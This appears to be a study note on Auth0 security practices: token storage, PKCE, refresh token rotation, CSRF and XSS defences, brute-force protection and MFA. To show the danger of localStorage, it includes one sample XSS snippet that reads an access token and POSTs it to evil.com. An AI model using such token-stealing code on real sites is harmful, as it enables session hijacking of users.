---
title: "Auth0 Lesson 11 — Security Best Practices"
date: 2026-04-13
tags:
  - pesquisa
  - arquitetura/security
  - auth0
  - identity
  - status/rascunho
area: arquitetura
---

# 🛡️ Auth0 Lesson 11 — Security Best Practices

## 🎯 Overview

This lesson covers the critical security considerations when using Auth0: where and how to store tokens, why PKCE is mandatory for public clients, refresh token rotation and reuse detection, common vulnerabilities and mitigations, and Auth0's built-in attack protection features.

---

## 🗄️ Token Storage: Where to Store Tokens

Token storage is one of the most important security decisions in your application. The wrong choice can expose users to token theft.

### Storage Options Comparison

| Storage | Access from JS | Survives Refresh | XSS Risk | CSRF Risk | Recommendation |
|---------|---------------|------------------|----------|-----------|----------------|
| **localStorage** | Yes | Yes | HIGH | No | Never for tokens |
| **sessionStorage** | Yes | No (tab only) | HIGH | No | Avoid for tokens |
| **In-memory (JS variable)** | Yes | No | Medium | No | Acceptable for SPAs |
| **HttpOnly Cookie** | No | Yes | LOW | Medium | Best for server-side |
| **Web Worker** | Isolated | No | LOW | No | Good for SPAs |
| **BFF Pattern** | N/A | Yes | LOWEST | Low (with CSRF token) | Best overall |

### Why localStorage is Risky

```javascript
// Any XSS vulnerability can steal tokens from localStorage:
// An attacker injects this script into your page:
const token = localStorage.getItem('access_token');
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token }),
});
// Game over — the attacker now has the user's access token
```

- `localStorage` is accessible to **any JavaScript** running on the page
- A single XSS vulnerability (from a third-party script, ad network, or dependency) can steal all stored tokens
- Tokens in `localStorage` persist indefinitely until explicitly removed
- There is **no way** to restrict access to `localStorage` per-script

> [!danger] Never Store Tokens in localStorage
> This is the #1 security mistake in SPAs. If any script on your page is compromised (including third-party libraries), all tokens in localStorage are exposed.

### HttpOnly Cookies

HttpOnly cookies **cannot be accessed by JavaScript** — only the browser sends them automatically with requests.

```javascript
// Server sets the cookie (Express example)
res.cookie('access_token', token, {
  httpOnly: true,     // Not accessible via document.cookie
  secure: true,       // Only sent over HTTPS
  sameSite: 'strict', // Not sent with cross-site requests
  maxAge: 3600000,    // 1 hour
  path: '/api',       // Only sent for API requests
});
```

Advantages:
- Immune to XSS-based token theft
- Automatic handling by the browser (no manual `Authorization` header)
- Can be scoped to specific paths

Disadvantages:
- Vulnerable to CSRF (mitigated with `SameSite` and CSRF tokens)
- Requires same-site API or proxy setup

### In-Memory Storage for SPAs

The Auth0 SPA SDK (`@auth0/auth0-spa-js`, which `@auth0/auth0-react` wraps) stores tokens **in-memory** by default:

```javascript
// The SDK handles this internally:
// - Access tokens are stored in a JavaScript closure (not accessible from console)
// - Tokens are lost on page refresh (the SDK uses silent auth or refresh tokens to get new ones)
// - No persistent storage = no XSS theft from storage
```

How token renewal works in SPAs:
1. User logs in → access token stored in memory
2. Page refresh → token is gone
3. SDK calls `getAccessTokenSilently()` → uses refresh token (if available) or silent auth (hidden iframe) to get a new token
4. New token is stored in memory again

> [!info] Silent Auth Limitations
> Safari's ITP (Intelligent Tracking Prevention) and other browser privacy features block third-party cookies, breaking silent auth via iframes. This is why **refresh token rotation** is now the recommended approach for SPAs.

### BFF (Backend for Frontend) Pattern

The BFF pattern is the **most secure** approach for SPAs. The browser never touches tokens directly.

```
┌──────────┐      Session Cookie      ┌──────────┐      Access Token      ┌──────────┐
│  Browser  │ ◄──────────────────────► │ BFF Server│ ◄──────────────────► │    API    │
│  (React)  │   (HttpOnly, Secure)     │ (Node.js) │   (Bearer token)     │  (Backend)│
└──────────┘                           └──────────┘                       └──────────┘
```

How it works:
1. Browser redirects to BFF for login → BFF redirects to Auth0
2. Auth0 returns authorization code to BFF
3. BFF exchanges code for tokens **server-side** (tokens never reach the browser)
4. BFF creates a **session** with the browser via HttpOnly cookie
5. Browser calls BFF endpoints → BFF attaches access token to upstream API calls
6. Token refresh happens **server-to-server** — browser only has a session cookie

```javascript
// BFF server (Express) — simplified example
const { auth } = require('express-openid-connect');

const config = {
  authRequired: false,
  auth0Logout: true,
  secret: process.env.SECRET,
  baseURL: process.env.BASE_URL,
  clientID: process.env.CLIENT_ID,
  clientSecret: process.env.CLIENT_SECRET,
  issuerBaseURL: process.env.ISSUER_BASE_URL,
  authorizationParams: {
    response_type: 'code',
    audience: 'https://my-api.example.com',
    scope: 'openid profile email read:data',
  },
};

app.use(auth(config));

// Proxy API calls — BFF adds the access token
app.get('/bff/data', requiresAuth(), async (req, res) => {
  const { access_token } = req.oidc.accessToken;
  const response = await fetch('https://my-api.example.com/data', {
    headers: { Authorization: `Bearer ${access_token}` },
  });
  const data = await response.json();
  res.json(data);
});
```

> [!tip] BFF Is the Recommended Pattern
> The OAuth 2.0 Security Best Current Practice (RFC 9700, January 2025) recommends the BFF pattern for browser-based applications. It eliminates all token exposure in the browser.

### Storage Recommendations by App Type

| App Type | Recommended Storage | Notes |
|----------|-------------------|-------|
| **SPA (React, Vue)** | In-memory + refresh token rotation | Or BFF pattern for higher security |
| **Regular Web App (Express, Next.js)** | Server-side session (HttpOnly cookie) | Tokens stay on the server |
| **Mobile (iOS)** | iOS Keychain | Never in UserDefaults or files |
| **Mobile (Android)** | Android Keystore | Never in SharedPreferences |
| **M2M (Backend)** | Environment variables or vault | Never in code or config files |

---

## 🔑 PKCE: Proof Key for Code Exchange

### What is PKCE?

PKCE (pronounced "pixy") is an extension to the OAuth 2.0 Authorization Code flow that **prevents authorization code interception attacks**. It's defined in [RFC 7636](https://tools.ietf.org/html/rfc7636).

### Why PKCE is Mandatory for Public Clients

Public clients (SPAs, mobile apps) **cannot securely store a client secret**. Without PKCE, an attacker who intercepts the authorization code could exchange it for tokens.

### How PKCE Works

```
1. Client generates a random code_verifier (43-128 chars)
2. Client computes code_challenge = SHA256(code_verifier) → Base64URL encode
3. Client sends code_challenge with the authorization request
4. Auth server stores the code_challenge
5. After login, Auth server returns authorization code
6. Client sends code + code_verifier to the token endpoint
7. Auth server computes SHA256(code_verifier) and compares with stored code_challenge
8. If they match → tokens are issued
```

```
┌──────────┐                              ┌──────────────┐
│  Client   │                              │   Auth0       │
└─────┬────┘                              └──────┬───────┘
      │  1. Generate code_verifier               │
      │  2. Compute code_challenge               │
      │                                          │
      │  /authorize?code_challenge=abc123        │
      │ ──────────────────────────────────────►  │
      │                                          │  3. Store code_challenge
      │  ◄──── Authorization Code ──────────────│
      │                                          │
      │  /token { code, code_verifier }          │
      │ ──────────────────────────────────────►  │
      │                                          │  4. Verify: SHA256(code_verifier)
      │                                          │     == stored code_challenge?
      │  ◄──── Access Token + ID Token ─────────│
      │                                          │
```

### PKCE in Practice

Auth0 SDKs handle PKCE automatically:

```javascript
// @auth0/auth0-react — PKCE is automatic
<Auth0Provider
  domain="your-tenant.us.auth0.com"
  clientId="YOUR_CLIENT_ID"
  authorizationParams={{
    redirect_uri: window.location.origin,
  }}
>
  {/* PKCE is used automatically for SPAs */}
</Auth0Provider>
```

If implementing manually:

```javascript
// 1. Generate code_verifier
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return btoa(String.fromCharCode(...array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// 2. Compute code_challenge
async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// 3. Include in authorization request
const codeVerifier = generateCodeVerifier();
const codeChallenge = await generateCodeChallenge(codeVerifier);

const authUrl = `https://your-tenant.us.auth0.com/authorize?` +
  `response_type=code&` +
  `client_id=YOUR_CLIENT_ID&` +
  `redirect_uri=${encodeURIComponent('http://localhost:3000/callback')}&` +
  `scope=openid profile email&` +
  `code_challenge=${codeChallenge}&` +
  `code_challenge_method=S256`;

// Store codeVerifier in sessionStorage (needed for the token exchange)
sessionStorage.setItem('code_verifier', codeVerifier);

// 4. After callback, exchange the code
const tokenResponse = await fetch('https://your-tenant.us.auth0.com/oauth/token', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    grant_type: 'authorization_code',
    client_id: 'YOUR_CLIENT_ID',
    code_verifier: sessionStorage.getItem('code_verifier'),
    code: authorizationCode,
    redirect_uri: 'http://localhost:3000/callback',
  }),
});
```

> [!info] RFC 9700 (Jan 2025)
> The updated OAuth 2.0 Security Best Current Practice now mandates PKCE for **all** OAuth clients (public AND confidential). Auth0 enforces PKCE by default for SPAs and mobile apps.

---

## 🔄 Refresh Token Rotation and Reuse Detection

### What is Refresh Token Rotation?

Every time a refresh token is used, a **new refresh token** is issued along with the new access token. The old refresh token is **immediately invalidated**.

```
Time 1: Client has RT-1
  → Client sends RT-1 to /oauth/token
  → Auth0 returns AT-2 + RT-2
  → RT-1 is now INVALID

Time 2: Client has RT-2
  → Client sends RT-2 to /oauth/token
  → Auth0 returns AT-3 + RT-3
  → RT-2 is now INVALID
```

### Reuse Detection

If a previously invalidated refresh token is used, Auth0 detects this as a potential **replay attack** and immediately revokes the **entire refresh token family**:

```
Scenario: Attacker steals RT-1 before the legitimate client uses it

Legitimate Client:
  → Sends RT-1 → Gets AT-2 + RT-2 → RT-1 invalidated

Attacker:
  → Sends RT-1 (stolen, already invalidated)
  → Auth0 detects REUSE of invalidated token
  → Auth0 revokes ALL tokens in the family (RT-2 included)
  → Both attacker AND legitimate user must re-authenticate
```

### Configuring Refresh Token Rotation in Auth0

1. Go to **Dashboard > Applications > [Your App] > Settings**
2. Scroll to **Refresh Token Rotation**
3. Enable **Rotation**
4. Set **Reuse Interval**: Grace period (in seconds) for network latency (recommended: 0-3 seconds)

Also configure expiration:

| Setting | Recommendation | Description |
|---------|---------------|-------------|
| **Absolute Expiration** | Enable | Token expires after a fixed time regardless of activity |
| **Absolute Lifetime** | 2592000 (30 days) | Maximum lifetime of the refresh token family |
| **Inactivity Expiration** | Enable | Token expires if not used within a period |
| **Inactivity Lifetime** | 86400 (1 day) | Time of inactivity before token expires |

### Using Refresh Tokens in SPAs

```tsx
// React — configure refresh tokens
<Auth0Provider
  domain={import.meta.env.VITE_AUTH0_DOMAIN}
  clientId={import.meta.env.VITE_AUTH0_CLIENT_ID}
  authorizationParams={{
    redirect_uri: window.location.origin,
  }}
  useRefreshTokens={true}      // Enable refresh token rotation
  cacheLocation="memory"        // Store in memory (not localStorage!)
>
  <App />
</Auth0Provider>
```

> [!tip] Why Refresh Token Rotation for SPAs?
> Safari's ITP and other browser privacy features block third-party cookies, making silent auth (hidden iframe) unreliable. Refresh token rotation provides a secure alternative that works across all browsers.

---

## ⚠️ Common Vulnerabilities

### 1. CSRF (Cross-Site Request Forgery)

**Attack**: An attacker tricks a user's browser into making authenticated requests to your app.

**Mitigations**:
- Use `SameSite=Strict` or `SameSite=Lax` cookies
- Implement CSRF tokens for state-changing requests
- Use the `state` parameter in OAuth flows (Auth0 SDKs do this automatically)

```javascript
// Express CSRF protection
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: { httpOnly: true, sameSite: 'strict' } });

app.post('/api/update', csrfProtection, (req, res) => {
  // Protected from CSRF
});
```

### 2. XSS (Cross-Site Scripting) and Token Theft

**Attack**: An attacker injects malicious JavaScript that steals tokens from `localStorage`, `sessionStorage`, or `document.cookie`.

**Mitigations**:
- **Never store tokens in localStorage or sessionStorage**
- Use HttpOnly cookies (not accessible via JS)
- Use Content Security Policy (CSP) headers
- Sanitize all user input
- Keep dependencies updated (supply chain attacks)

```
# Content Security Policy header
Content-Security-Policy: default-src 'self';
  script-src 'self' https://cdn.auth0.com;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https://*.auth0.com;
  frame-src https://*.auth0.com;
```

### 3. Token Replay Attacks

**Attack**: An attacker captures a valid access token and reuses it.

**Mitigations**:
- Use **short-lived access tokens** (e.g., 5-15 minutes)
- Implement **refresh token rotation** with reuse detection
- Use **token binding** (DPoP — Demonstrating Proof-of-Possession) where supported
- Validate `aud` (audience), `iss` (issuer), and `exp` (expiration) in your API

### 4. Redirect URI Manipulation

**Attack**: An attacker changes the `redirect_uri` to point to their own server, capturing the authorization code.

**Mitigations**:
- Auth0 enforces **exact redirect URI matching** (no wildcards in production)
- Register ALL callback URLs in the Auth0 Dashboard
- Avoid using wildcards (`*`) in production callback URLs

```
# Good — exact match
Allowed Callback URLs: https://myapp.com/callback

# Bad — too permissive
Allowed Callback URLs: https://*.myapp.com/*
```

### 5. Authorization Code Interception

**Attack**: On mobile devices, a malicious app registers the same custom URL scheme and intercepts the authorization code.

**Mitigations**:
- **PKCE** prevents the attacker from exchanging the intercepted code (they don't have the `code_verifier`)
- Use **Universal Links** (iOS) / **App Links** (Android) instead of custom URL schemes
- Always use PKCE (mandatory for public clients)

---

## 🚧 Rate Limiting and Brute Force Protection

### Auth0's Built-In Protections

Auth0 provides automatic attack protection that is **enabled by default**:

#### Brute Force Protection

Triggers when detecting repeated failed login attempts:

| Trigger | Threshold |
|---------|-----------|
| Same user, same IP | 10 consecutive failures |
| Any user, same IP (24h) | 100 failures |
| Signup attempts, same IP | 50 per minute |

When triggered:
- Account is **temporarily blocked**
- User receives a **block notification email** with an unblock link
- Admin is notified via email

Configuration: **Dashboard > Security > Attack Protection > Brute Force Protection**

#### Suspicious IP Throttling

Detects large volumes of login attempts from a single IP:

- Rate limits requests from suspicious IPs
- Can be configured to block or present a CAPTCHA

Configuration: **Dashboard > Security > Attack Protection > Suspicious IP Throttling**

### Custom Rate Limiting (API Side)

```javascript
const rateLimit = require('express-rate-limit');

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100,                   // 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
});

// Stricter limit for auth-related endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many authentication attempts, please try again later.',
});

app.use('/api/', apiLimiter);
app.use('/api/auth/', authLimiter);
```

---

## 🤖 Bot Detection and CAPTCHA

Auth0's **Bot Detection** uses machine learning to identify automated attacks.

### How It Works

- Auth0 analyzes login and signup attempts for bot-like patterns
- When a bot is detected, a **CAPTCHA challenge** is presented
- Auth0 uses **separate ML models** for login and signup flows
- Legitimate users see CAPTCHA only when flagged as suspicious

### Configuration

1. Go to **Dashboard > Security > Attack Protection > Bot Detection**
2. Enable Bot Detection
3. Configure for:
   - **Login**: Enable/disable CAPTCHA on login
   - **Signup**: Enable/disable CAPTCHA on signup

> [!info] Bot Detection and Universal Login
> Bot Detection requires **Universal Login** (the hosted login page). It does not work with embedded login (Lock or custom forms hosted in your app), because the CAPTCHA challenge is rendered by Auth0's login page.

---

## 🔍 Anomaly Detection in Auth0

Auth0's Anomaly Detection monitors for unusual patterns beyond brute force:

### Breached Password Detection

- Auth0 checks if a user's credentials have been found in **known data breaches**
- When detected, the user is notified and prompted to change their password
- Configuration: **Dashboard > Security > Attack Protection > Breached Password Detection**

### Adaptive MFA

Auth0 can **dynamically require MFA** based on risk signals:

- Login from a new device or location
- Login from a different country
- Login at an unusual time
- Multiple failed attempts before success

```javascript
// Action: Adaptive MFA based on risk
exports.onExecutePostLogin = async (event, api) => {
  // Force MFA for new devices
  if (event.authentication?.methods?.length === 0) {
    api.multifactor.enable('any');
    return;
  }

  // Force MFA for different country
  const lastCountry = event.user.user_metadata?.last_login_country;
  const currentCountry = event.request.geoip?.country_code;

  if (lastCountry && lastCountry !== currentCountry) {
    api.multifactor.enable('any', { allowRememberBrowser: false });
  }

  api.user.setUserMetadata('last_login_country', currentCountry);
};
```

---

## 🔐 MFA (Multi-Factor Authentication)

### Supported MFA Factors in Auth0

| Factor | Type | Description |
|--------|------|-------------|
| **One-Time Password (OTP)** | Something you have | TOTP apps (Google Authenticator, Authy) |
| **SMS** | Something you have | Code sent via text message |
| **Email** | Something you have | Code sent via email |
| **Push Notification** | Something you have | Auth0 Guardian app push notification |
| **WebAuthn (FIDO2)** | Something you have/are | Biometric (fingerprint, face) or hardware key (YubiKey) |
| **Recovery Codes** | Backup | One-time codes for when primary factor is unavailable |

### Setting Up MFA

#### Via Dashboard

1. Go to **Dashboard > Security > Multi-factor Auth**
2. Enable desired factors (e.g., One-Time Password, WebAuthn)
3. Set the **policy**:
   - **Never**: MFA disabled
   - **Always**: Every login requires MFA
   - **Adaptive**: Risk-based (recommended)
4. Configure **enrollment**:
   - Allow users to self-enroll
   - Required vs optional enrollment

#### Enforcing MFA via Actions

```javascript
exports.onExecutePostLogin = async (event, api) => {
  // Always require MFA
  api.multifactor.enable('any');

  // OR: require a specific factor
  api.multifactor.enable('otp');         // TOTP only
  api.multifactor.enable('push');        // Push notification only
  api.multifactor.enable('webauthn-roaming'); // Hardware key
  api.multifactor.enable('webauthn-platform'); // Biometric

  // OR: conditionally based on role
  const roles = event.authorization?.roles || [];
  if (roles.includes('admin') || roles.includes('finance')) {
    api.multifactor.enable('any', { allowRememberBrowser: false });
  }

  // OR: skip MFA for trusted networks
  const trustedIPs = ['1.2.3.4', '5.6.7.8'];
  if (!trustedIPs.includes(event.request.ip)) {
    api.multifactor.enable('any', { allowRememberBrowser: true });
  }
};
```

### MFA with the Auth0 Guardian SDK

For push notifications:

```bash
npm install auth0-guardian-js
```

```javascript
// Client-side Guardian enrollment
import Guardian from 'auth0-guardian-js';

const guardian = new Guardian({
  serviceUrl: 'https://YOUR_AUTH0_DOMAIN/mfa',
  requestToken: enrollmentToken, // from the enrollment ticket
});

// Start enrollment
const enrollment = await guardian.enroll({ method: 'push' });
```

---

## 📊 Security Checklist

| Check | Status | Priority |
|-------|--------|----------|
| Tokens stored securely (not in localStorage) | | Critical |
| PKCE enabled for all public clients | | Critical |
| Refresh token rotation enabled | | Critical |
| Short access token lifetimes (5-15 min) | | High |
| HttpOnly, Secure, SameSite cookies | | High |
| Brute force protection enabled | | High |
| Bot detection enabled | | High |
| Breached password detection enabled | | High |
| MFA enabled (at least for admins) | | High |
| CSP headers configured | | Medium |
| CORS properly restricted | | Medium |
| Callback URLs exact-match (no wildcards) | | Medium |
| Rate limiting on API endpoints | | Medium |
| Token audience and issuer validation | | Medium |
| Consider BFF pattern for SPAs | | Medium |

---

## 🔗 Related Notes

- [[auth0-lesson-07-hands-on-setup]]
- [[auth0-lesson-08-web-app-integration]]
- [[auth0-lesson-09-rules-actions-hooks]]
- [[auth0-lesson-10-roles-permissions-rbac]]
- [[auth0-lesson-12-social-enterprise-connections]]

## 📖 Sources

- [Auth0 Token Best Practices](https://auth0.com/docs/secure/tokens/token-best-practices)
- [Refresh Token Rotation](https://dev.auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation)
- [What Are Refresh Tokens and How to Use Them Securely](https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/)
- [Securing SPAs with Refresh Token Rotation](https://auth0.com/blog/securing-single-page-applications-with-refresh-token-rotation/)
- [The Backend for Frontend Pattern (BFF)](https://auth0.com/blog/the-backend-for-frontend-pattern-bff/)
- [Auth0 Bot Detection](https://auth0.com/docs/secure/attack-protection/bot-detection)
- [Auth0 Brute Force Protection](https://auth0.com/docs/anomaly-detection/guides/enable-disable-brute-force-protection)
- [Auth0 MFA — Get Started](https://auth0.com/learn/get-started-with-mfa)
- [Auth0 Anomaly Detection](https://auth0.com/learn/anomaly-detection)
- [Proactive Auth0 Security Posture](https://auth0.com/blog/proactive-auth0-security-posture/)
- [Auth0 Best Security Practices (AppSecure)](https://www.appsecure.security/blog/auth0-best-security-practices)
- [RFC 9700 — OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/rfc9700/)
- [RFC 7636 — PKCE](https://tools.ietf.org/html/rfc7636)
